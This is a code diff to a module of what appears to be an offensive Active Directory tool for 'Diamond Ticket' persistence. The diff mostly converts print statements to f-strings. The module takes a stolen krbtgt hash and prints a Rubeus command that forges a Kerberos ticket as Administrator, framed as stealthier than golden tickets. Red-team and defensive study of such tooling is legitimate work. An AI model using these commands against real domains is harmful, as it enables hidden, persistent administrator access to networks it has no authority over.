@@ -1,6 +1,5 @@
-"""Diamond ticket persistence — modify legitimate TGTs for stealth."""
+"""Diamond ticket persistence  -  modify legitimate TGTs for stealth."""
 
-from __future__ import annotations
 from typing import Any
 
 MANIFEST = {
@@ -20,7 +19,7 @@ def run(args: Any) -> int:
     domain_sid = getattr(args, "domain_sid", None)
 
     print("[*] Diamond Ticket Persistence")
-    print("[*] Domain: {}".format(cred.domain))
+    print(f"[*] Domain: {cred.domain}")
     print("[*] Unlike Golden Tickets, Diamond Tickets modify real TGTs for better OPSEC")
 
     if not krbtgt_hash:
@@ -36,7 +35,7 @@ def run(args: Any) -> int:
         return 1
 
     print("[*] Requesting legitimate TGT first, then modifying PAC")
-    print("[*] krbtgt key: {}...".format(krbtgt_hash[:16]))
-    print("[*] For true diamond ticket, use: Rubeus.exe diamond /krbkey:{} /user:Administrator /enctype:aes256".format(krbtgt_hash))
+    print(f"[*] krbtgt key: {krbtgt_hash[:16]}...")
+    print(f"[*] For true diamond ticket, use: Rubeus.exe diamond /krbkey:{krbtgt_hash} /user:Administrator /enctype:aes256")
 
     return 0
